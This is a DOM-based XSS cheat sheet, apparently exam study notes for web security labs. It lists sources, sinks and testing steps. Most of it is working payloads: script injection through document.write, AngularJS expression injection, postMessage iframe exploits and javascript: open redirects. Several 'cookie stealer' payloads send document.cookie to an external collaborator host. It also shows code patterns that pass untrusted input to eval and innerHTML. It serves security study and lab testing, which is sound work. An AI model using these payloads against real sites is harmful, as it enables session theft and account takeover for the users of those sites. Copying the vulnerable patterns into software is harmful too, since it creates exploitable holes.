# DOM-based XSS - Stage 1

## 🎯 Overview

DOM-based XSS occurs when JavaScript code processes user input and writes it to the DOM in an unsafe way. Unlike reflected/stored XSS, the malicious payload never reaches the server.

## 🔍 Detection

### Common Sinks
- `document.write()`
- `innerHTML`
- `outerHTML`
- `eval()`
- `setTimeout()`
- `setInterval()`

### Common Sources
- `location.search`
- `location.hash`
- `document.referrer`
- `document.cookie`
- `postMessage()`

## 🔥 Key Payloads

### 1. document.write with location.search
**Context:** Product page with `storeId` parameter

```javascript
?storeId="></select><script>alert(1)</script>
```

**Exploit Server Delivery:**
```html
<iframe src="https://vulnerable-site.com/product?productId=1&storeId="></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>">
```

---

### 2. AngularJS Expression Injection
**Context:** AngularJS with HTML encoding

```javascript
{{constructor.constructor('alert(1)')()}}
```

**Cookie Stealer:**
```javascript
{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
```

---

### 3. Reflected DOM XSS
**Context:** Escaping JavaScript string context

```javascript
\\"-alert()}//
```

**Data Exfiltration:**
```javascript
\\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
```

---

### 4. Stored DOM XSS
**Context:** Incomplete sanitization (only first `<>` removed)

```html
<><img src=1 onerror=alert(1)>
```

**Cookie Stealer:**
```html
<><img src=1 onerror="window.location='http://burp.oastify.com/?c='+document.cookie">
```

---

### 5. Web Messages XSS
**Context:** Vulnerable `postMessage()` handler

**Exploit Server:**
```html
<iframe src="https://vulnerable-site.com/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

**With JavaScript URL:**
```html
<iframe src="https://vulnerable-site.com/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

**With JSON.parse:**
```html
<iframe src="https://vulnerable-site.com/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

---

### 6. DOM-based Open Redirection
**Context:** Unsafe redirect based on URL parameter

```javascript
?url=javascript:alert(1)
```

**Exploit:**
```html
<iframe src="https://vulnerable-site.com/post?postId=1&url=javascript:document.location='http://burp.oastify.com/?c='+document.cookie">
```

---

### 7. DOM-based Cookie Manipulation
**Context:** Setting cookies via DOM

```javascript
?product=1&'><script>document.cookie='lastViewedProduct=x'</script>
```

## 🛠️ Testing Methodology

### Step 1: Identify Sources
Look for user-controllable input:
```javascript
// Check URL parameters
location.search
location.hash

// Check referrer
document.referrer

// Check postMessage handlers
window.addEventListener('message', ...)
```

### Step 2: Identify Sinks
Find dangerous functions:
```javascript
document.write()
element.innerHTML = 
eval()
setTimeout()
location = 
```

### Step 3: Trace Data Flow
Use browser DevTools to trace how data flows from source to sink.

### Step 4: Craft Payload
Based on the context, craft appropriate payload to break out.

## 🎓 Exam Tips

1. **Use DOM Invader** - Burp's DOM Invader extension helps identify DOM XSS
2. **Check JavaScript files** - Look for unsafe DOM manipulation
3. **Test all URL parameters** - Including hash fragments
4. **Look for postMessage** - Web messaging is a common exam topic
5. **Use browser DevTools** - Set breakpoints to understand data flow

## 🔗 Common Patterns

### Pattern 1: URL Parameter → document.write
```javascript
// Vulnerable code
var storeId = new URLSearchParams(window.location.search).get('storeId');
document.write('<option>' + storeId + '</option>');

// Exploit
?storeId=</option><script>alert(1)</script>
```

### Pattern 2: postMessage → innerHTML
```javascript
// Vulnerable code
window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data;
});

// Exploit from iframe
<iframe src="target" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(1)>','*')">
```

### Pattern 3: Hash Fragment → eval
```javascript
// Vulnerable code
eval(location.hash.slice(1));

// Exploit
#alert(1)
```

## 📚 References

- [PortSwigger DOM-based Vulnerabilities](https://portswigger.net/web-security/dom-based)
- [DOM XSS Wiki](https://github.com/wisec/domxsswiki/wiki)